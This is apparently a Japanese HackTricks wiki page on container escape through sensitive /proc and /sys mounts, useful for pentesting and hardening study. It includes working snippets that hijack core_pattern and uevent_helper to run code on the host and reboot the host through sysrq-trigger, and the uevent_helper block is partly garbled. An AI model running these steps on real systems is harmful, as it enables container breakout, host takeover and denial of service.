# Sensitive Mounts

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

`/proc` と `/sys` の適切な名前空間の分離なしでの露出は、攻撃面の拡大や情報漏洩を含む重大なセキュリティリスクを引き起こします。これらのディレクトリには、誤って設定されたり、無許可のユーザーによってアクセスされたりすると、コンテナの脱出、ホストの変更、またはさらなる攻撃を助ける情報を提供する可能性のある機密ファイルが含まれています。たとえば、`-v /proc:/host/proc` を誤ってマウントすると、そのパスベースの性質により AppArmor の保護を回避し、`/host/proc` が保護されない状態になります。

**各潜在的脆弱性の詳細は** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**で確認できます。**

## procfs 脆弱性

### `/proc/sys`

このディレクトリは、通常 `sysctl(2)` を介してカーネル変数を変更するためのアクセスを許可し、いくつかの懸念されるサブディレクトリを含んでいます。

#### **`/proc/sys/kernel/core_pattern`**

* [core(5)](https://man7.org/linux/man-pages/man5/core.5.html) に記載されています。
* コアファイル生成時に実行するプログラムを定義でき、最初の 128 バイトを引数として使用します。ファイルがパイプ `|` で始まる場合、コード実行につながる可能性があります。
*   **テストと悪用の例**:

```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes # 書き込みアクセスのテスト
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern # カスタムハンドラを設定
sleep 5 && ./crash & # ハンドラをトリガー
```

#### **`/proc/sys/kernel/modprobe`**

* [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html) に詳細が記載されています。
* カーネルモジュールを読み込むために呼び出されるカーネルモジュールローダーへのパスを含んでいます。
*   **アクセス確認の例**:

```bash
ls -l $(cat /proc/sys/kernel/modprobe) # modprobe へのアクセスを確認
```

#### **`/proc/sys/vm/panic_on_oom`**

* [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html) に参照されています。
* OOM 条件が発生したときにカーネルがパニックを起こすか、OOM キラーを呼び出すかを制御するグローバルフラグです。

#### **`/proc/sys/fs`**

* [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html) に従い、ファイルシステムに関するオプションと情報を含んでいます。
* 書き込みアクセスは、ホストに対するさまざまなサービス拒否攻撃を可能にします。

#### **`/proc/sys/fs/binfmt_misc`**

* マジックナンバーに基づいて非ネイティブバイナリ形式のインタプリタを登録できます。
* `/proc/sys/fs/binfmt_misc/register` が書き込み可能な場合、特権昇格やルートシェルアクセスにつながる可能性があります。
* 関連するエクスプロイトと説明:
* [Poor man's rootkit via binfmt\_misc](https://github.com/toffan/binfmt\_misc)
* 詳細なチュートリアル: [Video link](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

### その他の `/proc`

#### **`/proc/config.gz`**

* `CONFIG_IKCONFIG_PROC` が有効な場合、カーネル設定を明らかにする可能性があります。
* 実行中のカーネルの脆弱性を特定するために攻撃者にとって有用です。

#### **`/proc/sysrq-trigger`**

* Sysrq コマンドを呼び出すことができ、即座にシステムを再起動したり、他の重要なアクションを引き起こす可能性があります。
*   **ホストを再起動する例**:

```bash
echo b > /proc/sysrq-trigger # ホストを再起動
```

#### **`/proc/kmsg`**

* カーネルリングバッファメッセージを公開します。
* カーネルのエクスプロイト、アドレスリーク、機密システム情報の提供に役立ちます。

#### **`/proc/kallsyms`**

* カーネルがエクスポートしたシンボルとそのアドレスをリストします。
* KASLR を克服するためのカーネルエクスプロイト開発に不可欠です。
* アドレス情報は、`kptr_restrict` が `1` または `2` に設定されている場合に制限されます。
* 詳細は [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html) に記載されています。

#### **`/proc/[pid]/mem`**

* カーネルメモリデバイス `/dev/mem` とインターフェースします。
* 歴史的に特権昇格攻撃に対して脆弱です。
* 詳細は [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html) に記載されています。

#### **`/proc/kcore`**

* システムの物理メモリを ELF コア形式で表します。
* 読み取ることでホストシステムや他のコンテナのメモリ内容が漏洩する可能性があります。
* 大きなファイルサイズは、読み取りの問題やソフトウェアのクラッシュを引き起こす可能性があります。
* 詳細な使用法は [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/) に記載されています。

#### **`/proc/kmem`**

* カーネル仮想メモリを表す `/dev/kmem` の代替インターフェースです。
* 読み取りと書き込みが可能で、カーネルメモリの直接的な変更を許可します。

#### **`/proc/mem`**

* 物理メモリを表す `/dev/mem` の代替インターフェースです。
* 読み取りと書き込みが可能で、すべてのメモリの変更には仮想アドレスを物理アドレスに解決する必要があります。

#### **`/proc/sched_debug`**

* プロセススケジューリング情報を返し、PID 名前空間の保護を回避します。
* プロセス名、ID、および cgroup 識別子を公開します。

#### **`/proc/[pid]/mountinfo`**

* プロセスのマウント名前空間内のマウントポイントに関する情報を提供します。
* コンテナの `rootfs` またはイメージの場所を公開します。

### `/sys` 脆弱性

#### **`/sys/kernel/uevent_helper`**

* カーネルデバイスの `uevents` を処理するために使用されます。
* `/sys/kernel/uevent_helper` に書き込むことで、`uevent` トリガー時に任意のスクリプトを実行できます。
*   **悪用の例**: %%%bash

#### ペイロードを作成

echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper

#### コンテナの OverlayFS マウントからホストパスを見つける

host\_path=$(sed -n 's/._\perdir=(\[^,]_).\*/\1/p' /etc/mtab)

#### 悪意のあるヘルパーに uevent\_helper を設定

echo "$host\_path/evil-helper" > /sys/kernel/uevent\_helper

#### uevent をトリガー

echo change > /sys/class/mem/null/uevent

#### 出力を読み取る

cat /output %%%

#### **`/sys/class/thermal`**

* 温度設定を制御し、DoS 攻撃や物理的損傷を引き起こす可能性があります。

#### **`/sys/kernel/vmcoreinfo`**

* カーネルアドレスを漏洩させ、KASLR を危険にさらす可能性があります。

#### **`/sys/kernel/security`**

* `securityfs` インターフェースを保持し、AppArmor のような Linux セキュリティモジュールの設定を許可します。
* アクセスにより、コンテナがその MAC システムを無効にする可能性があります。

#### **`/sys/firmware/efi/vars` と `/sys/firmware/efi/efivars`**

* NVRAM 内の EFI 変数と対話するためのインターフェースを公開します。
* 誤設定や悪用により、ラップトップがブリックされたり、ホストマシンが起動不能になる可能性があります。

#### **`/sys/kernel/debug`**

* `debugfs` はカーネルへの「ルールなし」のデバッグインターフェースを提供します。
* 制限のない性質のため、セキュリティ問題の歴史があります。

### References

* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
* [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc\_group\_understanding\_hardening\_linux\_containers-1-1.pdf)
* [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container\_whitepaper.pdf)

<figure><img src="../../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
